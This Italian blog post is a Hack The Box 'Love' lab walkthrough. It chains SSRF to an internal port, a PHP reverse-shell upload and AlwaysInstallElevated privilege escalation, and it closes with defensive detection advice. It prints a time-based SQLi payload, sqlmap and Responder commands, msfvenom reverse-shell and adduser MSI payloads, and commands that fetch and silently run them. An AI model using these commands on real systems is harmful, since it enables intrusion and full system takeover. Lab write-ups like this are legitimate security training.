---
title: 'HTB Love Walkthrough: SSRF, SQLi Time-Based e Privesc'
slug: htb-love-walkthrough
description: 'Write-Up HTB Love,Easy VM : SQLi time-based, tentativo NTLM su Responder, SSRF verso la 5000 e privesc con AlwaysInstallElevated. Ogni vicolo cieco spiegato.'
image: /love-walktrough-hack-the-box-htb-easy.webp
draft: false
date: 2026-07-14T00:00:00.000Z
categories:
  - walkthroughs
subcategories:
  - easy
tags:
  - AlwaysInstallElevated
  - SSRF
  - htb writeup
---

# HTB Love Walkthrough: quando una macchina "Easy" ti fa perdere tempo 

Love è etichettata come Windows Easy su Hack The Box. Sulla carta è un percorso lineare: SSRF, credenziali, upload, privesc nota. Nella pratica, se segui il playbook standard passo dopo passo, finisci a inseguire piste che sembrano promettenti e non portano da nessuna parte. Questo walkthrough segue il percorso reale che ho fatto, comprese le strade morte — perché capire *perché* una pista non porta a niente è formativo tanto quanto trovare quella giusta.

**Target**: HTB Love (Windows, difficoltà Easy)
**Tecniche coperte**: enumerazione con tool custom, SQLi time-based, tentativo di NTLM capture via Responder, SSRF, RCE diretta via upload, AlwaysInstallElevated

***

## Ricognizione

Invece di lanciare nmap a mano ogni volta, uso **mynmap**, il mio wrapper che trovate sul mio GitHub — automatizza lo scan completo delle porte TCP più lo script scan sulle porte trovate, e mi restituisce già un report strutturato senza dover ricopiare comandi ogni volta.

Output riassunto contro `10.129.48.103`:

```
80/tcp    open  http         Apache httpd 2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
443/tcp   open  ssl/http     Apache httpd 2.4.46, cert CN=staging.love.htb (org: ValentineCorp)
445/tcp   open  microsoft-ds Windows 10 Pro 19042 (workgroup: WORKGROUP)
3306/tcp  open  mysql        MariaDB 10.3.24 or later (unauthorized)
5000/tcp  open  http         Apache httpd 2.4.46, risponde 403 Forbidden
5040/tcp  open  unknown
7680/tcp  open  pando-pub?
49664-49670/tcp open msrpc
```

Con un solo passaggio mynmap mi ha già dato quasi tutto quello che serve per orientarmi:

* hostname macchina: `LOVE`, workgroup `WORKGROUP`
* SMB signing disabilitato (dangerous, but default) — utile da tenere a mente, ma senza credenziali non serve a molto subito
* MariaDB 10.3.24 in ascolto ma non raggiungibile dal mio IP
* certificato TLS sulla 443 che rivela un secondo vhost: `staging.love.htb`
* porta 5000 che risponde solo 403 dall'esterno — è il primo segnale che quel servizio ha un controllo ad-hoc sull'origine della richiesta

Aggiungo i domini a `/etc/hosts` e passo all'enumerazione web.

## Voting System su love.htb: la SQLi che non porta a niente

Su `love.htb` c'è un login per un "Voting System" in PHP. Provo un payload time-based sul campo ID, del tipo:

```
1' AND SLEEP(5)-- -
```

La risposta arriva con un delay coerente con la SLEEP — SQLi confermata, ed è **time-based blind**, non error-based. Nessun messaggio di errore SQL visibile in risposta, solo la differenza di tempo. Questo è già un indizio di quanto sarà lento sfruttarla: senza output diretto, ogni bit di dato richiesto richiede una richiesta HTTP a parte.

Per avere una conferma automatizzata (e capire se l'estrazione fosse realisticamente fattibile), lancio anche sqlmap sul parametro:

```bash
sqlmap -u "http://love.htb/login.php" --data="id=1&password=x" -p id --technique=T --batch
```

sqlmap conferma la stessa cosa vista a mano: injection **time-based blind** valida, nessuna tecnica boolean/UNION disponibile su quel parametro. Con `--dbs` provo a enumerare i database, ma i tempi di risposta per ogni singola richiesta rendono l'intera enumerazione lentissima — per capire la logica dietro le tecniche che sqlmap prova automaticamente vale la pena leggere il [repository ufficiale su GitHub](https://github.com/sqlmapproject/sqlmap).

A conti fatti, il tempo necessario per tirare fuori qualcosa di utile (utenti, hash) è totalmente sproporzionato rispetto a quello che serve per completare una macchina Easy. È un pattern che vale la pena riconoscere presto: se una tecnica valida richiede minuti per ogni singolo carattere estratto, quasi sempre esiste una via più diretta altrove. La segno come conferma di vulnerabilità presente, ma non ci investo altro tempo. Per un ripasso più a fondo sulle tecniche di SQL injection, ho scritto qualcosa di più esteso nell'[articolo su SQL injection su Hackita](https://hackita.it/articoli/sql-injection-mssql) (lì il focus è MSSQL, ma i principi di blind/time-based sono gli stessi).

## Vicolo cieco numero due: provare a rubare l'hash NTLM via 5000

Parallelamente, dato che la porta 5000 sembra raggiungibile solo da origine locale/interna, provo un'altra via: se riesco a far generare al server una richiesta verso un path UNC (`\\<mio-ip>\share`), posso intercettare un handshake NTLM con Responder e provare a craccare l'hash offline.

```bash
sudo responder -I tun0
```

Passando un path UNC al posto di un URL nei campi che sospetto vulnerabili a SSRF, vedo effettivamente del traffico in arrivo su Responder — una richiesta SMB parte dal target verso di me. Ma l'handshake non si completa mai in modo utile: nessun hash NTLMv2 viene catturato in forma valida. Probabilmente il servizio che genera la richiesta non è quello che gestisce autenticazione SMB (il traffico è solo un side-effect di qualche resolver, non un vero tentativo di auth), oppure il firewall interno filtra l'uscita SMB verso IP esterni non aspettati. In ogni caso: tempo investito, zero risultato concreto.

Due strade morte in fila fanno parte del gioco. La cosa da evitare è continuare a insistere sulla stessa idea con piccole varianti — meglio segnare il finding, mollarlo, e tornare all'enumerazione.

## SSRF vero: staging.love.htb verso la porta 5000

Su `staging.love.htb` c'è un'app diversa, orientata alla scansione file. Nella barra di navigazione, la voce "Demo" porta a `/beta.php`, dove trovo esattamente quello che serve per un SSRF: un campo di input con la label tipo "Inserisci URL del file da scansionare", un pulsante di invio, e sotto il risultato della "scansione" — in pratica il contenuto grezzo di qualunque cosa il server riesca a recuperare da quell'URL. È il classico pattern da manuale: un servizio che fa da proxy verso una risorsa esterna decisa dall'utente, senza nessun controllo su dove quella risorsa possa trovarsi (per un approfondimento sulla teoria vedi la [SSRF Prevention Cheat Sheet di OWASP](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html)).

Test di conferma SSRF con un web server locale:

```bash
python3 -m http.server 80
```

Il target effettua la richiesta verso di me — SSRF confermata. A quel punto passo `http://127.0.0.1:5000` come parametro, e la porta 5000 — che dall'esterno risponde solo 403 — restituisce il contenuto reale quando la richiesta arriva da localhost. Controllo di accesso basato solo sull'IP sorgente, bypassato con un endpoint capace di fare richieste server-side.

La pagina recuperata espone le credenziali del pannello admin del Voting System:

```
username: admin
password: @LoveIsInTheAir!!!!
```

Stesso principio, contesto diverso, dell'attacco che ho documentato nell'[hub post-exploitation su Hackita](https://hackita.it/articoli/post-exploitation): un controllo di accesso basato solo sull'origine della richiesta non è mai sufficiente da solo.

## RCE diretta: niente searchsploit, niente PoC pubblici

Con le credenziali admin valide entro nel pannello. Non uso lo script PoC pubblico per l'RCE via upload — gli URL hardcoded al suo interno assumono quasi sempre un path di installazione (`/votingsystem/...`) che spesso non corrisponde a quello reale, e perdere tempo a fixare uno script altrui quando posso fare la stessa cosa a mano non ha senso.

Vado dritto:

1. Dal pannello admin, uso la funzione di gestione utenti/voters per creare un secondo account con privilegi admin — persistenza minima nel caso la sessione corrente scada
2. Dal profilo utente, nel form di modifica c'è il campo upload immagine, senza alcun controllo su tipo/estensione del file
3. Al posto di una webshell minimale a una riga, carico una reverse shell PHP più robusta — quella di **Ivan Sincek**, alternativa più stabile e gestita rispetto alla classica pentestmonkey, con gestione errori migliore sulla connessione di ritorno

Configuro IP e porta locali nello script prima dell'upload, lo salvo come `shell.php`, lo carico al posto della foto profilo. Nessun filtro lato server blocca l'operazione — il file finisce direttamente nella webroot raggiungibile.

Metto `nc` in ascolto:

```bash
rlwrap nc -lnvp 443
```

Visito il path dell'immagine caricata nel browser (visibile dal sorgente della pagina profilo dopo l'upload) e la reverse shell richiama indietro. Connessione ricevuta:

```
whoami
love\phoebe
```

## Shell come Phoebe e user flag

```
C:\Users\Phoebe\Desktop> type user.txt
```

## Privesc: il tentativo con adduser che non ha funzionato

Enumerazione post-exploitation rapida: registro, permessi cartelle, servizi con path non quotati — la stessa checklist che seguo sempre e che ho messo giù per esteso nell'[articolo su Windows Privilege Escalation di Hackita](https://hackita.it/articoli/windows-privilege-escalation). Il finding decisivo è lo stesso di sempre su questa macchina:

```
AlwaysInstallElevated set to 1 in HKLM!
AlwaysInstallElevated set to 1 in HKCU!
```

Primo tentativo: invece di puntare subito a una reverse shell, provo a creare direttamente un utente amministratore locale, così da avere un accesso più "pulito" e persistente (RDP/WinRM) invece di una shell reverse legata a un singolo listener:

```bash
msfvenom -p windows/adduser USER=hackita PASS=P@ssword123! -f msi-nouac -o alwe.msi
```

È il comando "da manuale" per questa tecnica — lo stesso che trovate documentato nella [pagina AlwaysInstallElevated di HackTricks](https://hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html), che consiglio di tenere sempre a portata quando enumerate privesc Windows.

Carico ed eseguo l'MSI:

```powershell
powershell wget http://10.10.14.6/alwe.msi -outfile alwe.msi
msiexec /quiet /qn /i alwe.msi
```

Nessun errore visibile, ma anche nessuna conferma: l'utente `hackita` non risulta creato, e un tentativo di WinRM con quelle credenziali fallisce. Il payload `adduser` ha un problema strutturale per questo scenario: non dà nessun feedback di riuscita nella shell che hai già — se l'installazione fallisce silenziosamente (permessi, architettura, o semplicemente un problema con il formato `-nouac` su questa build), non hai modo di saperlo se non riprovando con qualcos'altro che dia conferma attiva. Ho perso tempo a fidarmi di un payload "silenzioso" invece di uno che si fa sentire.

Cambio approccio e torno a un payload che mi dà un riscontro immediato: una reverse shell.

```bash
msfvenom -p windows -a x64 -p windows/x64/shell_reverse_tcp LHOST=10.10.14.6 LPORT=443 -f msi -o rev.msi
```

```powershell
powershell wget http://10.10.14.6/rev.msi -outfile rev.msi
msiexec /quiet /qn /i rev.msi
```

```bash
rlwrap nc -lnvp 443
```

Shell ricevuta come `nt authority\system`:

```
C:\Users\Administrator\Desktop> type root.txt
```

Macchina completata.

## Detection: cosa avrebbe fermato questo attacco

* **SSRF**: whitelist di destinazioni per `beta.php`, blocco esplicito di loopback e range privati — avrebbe reso inutile sia il furto credenziali sulla 5000 sia il tentativo (fallito) di NTLM capture
* **Upload non filtrato**: verifica del contenuto reale del file, non solo estensione; storage fuori dal webroot eseguibile
* **AlwaysInstallElevated**: policy di hardening che disabilita questa chiave per default — controllo a costo zero da verificare sempre in una baseline Windows

## FAQ

**Perché una SQL injection confermata non sempre vale la pena sfruttarla fino in fondo?**
Perché il costo di estrazione conta quanto la sua presenza. Una time-based blind senza output diretto richiede una richiesta per ogni bit di informazione: se il tempo stimato è sproporzionato rispetto al contesto (una macchina Easy, un engagement a tempo), spesso conviene documentarla e cercare un vettore più diretto.

**Perché un tentativo di NTLM relay/capture può arrivare su Responder senza dare un hash valido?**
Il traffico SMB in arrivo non implica sempre un tentativo di autenticazione completo — a volte è un side-effect di resolver o path UNC gestiti in modo diverso dall'applicazione, oppure il traffico in uscita viene filtrato dal firewall interno prima di completare l'handshake NTLM.

**Perché un payload msfvenom tipo `windows/adduser` è rischioso da usare come primo tentativo di privesc?**
Perché non dà nessun canale di ritorno per confermare l'esito. Se fallisce silenziosamente (permessi, architettura, formato dell'MSI), non hai modo di saperlo senza un secondo canale di verifica. Meglio partire con un payload che dia un riscontro attivo (reverse/bind shell), e solo dopo, con accesso confermato, creare eventuale persistenza come un nuovo utente admin.

***

*Walkthrough basato su lab didattico Hack The Box, ambiente di test autorizzato. Utile per la preparazione a certificazioni offensive come OSCP/OSCE3.*
